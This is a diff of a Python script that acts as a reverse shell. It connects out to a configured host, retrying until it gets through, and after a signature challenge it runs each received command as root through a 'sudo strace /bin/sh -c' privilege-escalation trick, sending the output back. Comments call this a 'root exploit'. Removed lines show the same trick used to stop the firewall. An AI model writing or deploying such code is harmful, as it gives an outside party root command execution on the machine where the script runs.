@@ -18,24 +18,20 @@ with open("config.json") as file:
 host = config["host"]
 port = config["port"]
 
-#disable firewall (cant connect w/o)
-#utilizes strace vuln to use systemctl as root
-#os.system('sudo strace -o /dev/null /bin/sh -c "systemctl stop firewalld"')
 # next create a socket object 
 s = socket.socket()         
 print ("Socket successfully created") 
-
+#hit client port until we connect
 while True:
     try:
         s.connect((host,port))
     except Exception:
         continue
     break
-# a forever loop until we interrupt it or 
-# an error occurs 
-while True: 
 
-# Establish connection with client. 
+
+while True: 
+#send request and verify its signed correctly
   
   request_to_sign = os.urandom(32)
   s.sendall(request_to_sign)
@@ -45,6 +41,7 @@ while True:
 
   s.send('Thank you for connecting'.encode()) 
   while True:
+      #recieve command, pass it through strace to get root exploit, and send output back
       cmd = s.recv(8024).decode("utf-8").strip()
       inputcmd = ["sudo","strace","-o","/dev/null","/bin/sh","-c", cmd]
       if cmd == "close":
@@ -57,7 +54,6 @@ while True:
       
   # Close the connection with the client 
   s.close()
-  #os.system('sudo strace -o /dev/null /bin/sh -c "systemctl start firewalld"')
 
   
   # Breaking once connection closed
